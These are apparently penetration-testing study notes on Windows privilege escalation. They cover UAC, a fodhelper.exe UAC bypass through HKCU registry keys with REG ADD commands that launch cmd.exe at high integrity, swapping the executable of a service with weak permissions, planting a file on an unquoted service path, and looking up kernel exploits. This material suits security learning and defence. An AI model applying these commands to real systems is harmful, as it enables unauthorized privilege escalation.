=======================================
windows privileges and integrity levels
=======================================
authenticate --> generate an access token --> sign to the user
the token has various information of user
security identifier(SID)
	identiry token, user account, group account

=========================
user account control(UAC)
=========================
access control system
	
non-administrator
	need to credential prompt to do administrative tasks
administrator
	use consent prompt since it's already administrator
	tokens
		medium integrity level
		high intregrity level

==========
UAC bypass
==========
windows 10 build 1709
	fodhelper.exe vuln
		runs with high intregrity
		responsible for managing language changes in the operating system
		it interacts with registry
		the registry contains command execution

inspect the manifest
	SysinternalsSuite(C:\Windows\System32\SysinternalsSuite\)
		sigcheck.exe -a -m <target program>
			-a : extended information
			-m : dump the manifest
			autoElevate : automatically elevate integrity

enumerate and exploit the vulnerable program with process monitor
	SysinternalsSuite(C:\Windows\System32\SysinternalsSuite\)
		procmon.exe : advanced process monitor
		steps
			1. filter : process name is fodhelper.exe
			2. filter : operation contains Reg
			3. filter : Path contains HKCU
				(we can control only HKEY_CURRENT_USER)
			4. found interesting registry key : HKCU:\Software\Classes\ms-settings\shell\open\command
			5. check the registry
				--> DelegateExecute
			6. filter : result ccontains NAME NOT FOUND
			7. add registry key that is not found
				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
			8. rerun the program and check the process successed
				filter : result contains SUCCESS
				rm filter : result contains NAME NOT FOUND
			9. add registry key value
				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
			10. edit registry key value that you want
				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
			11. rerun the program and got the shell that is high integrity
			

=========================
insecure file permissions
=========================
program runs as nt authority\system and didn't controlled the permission during the installation
if Everyone can read / write / execute the program,

step
	1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
	2. enumerate by icaacls
		icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
	3. replace the vulnerable executable file to malicious executable file
	4. restart the service. but the restarted user is not administrative user. so failed
	5. find when the system restart the service with high privilege
		wmic service where caption="Serviio" get name, caption, state, startmode
		result : on booting, it automatically started
	6. reboot
		shutdown /r /t 0

==================================
leveraging uniquoted service paths
==================================
Windows 7
when the file path contain space but no quotes, windows try to find valid path/executable file
	ex. C:\\Program Files\My Program\My Service/service.exe
		--> C:\\Program.exe
		--> C:\\Program Files\My.exe
		--> C:\\Program Files\My Program\My.exe
		--> C:\\Program Files\My Program\My Service/service.exe
step
	1. find the path containing space but no quoted
		wmic service get displaynanme,pathname
	2. inject a malicious file into possible path
		ex. copy <malicious file> C:\\Program Files\My.exe	


==============================
windows kernel vulnerabilities
==============================
step
	1. check the system architecture
		systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
	2. enumerate driver
		driverquery /v
	3. search the vulnerability
		searchsploit
	4. exploit

========================
compile C/C++ on windows
========================
download mingw-w64 and run mingw-w64.bat
use gcc
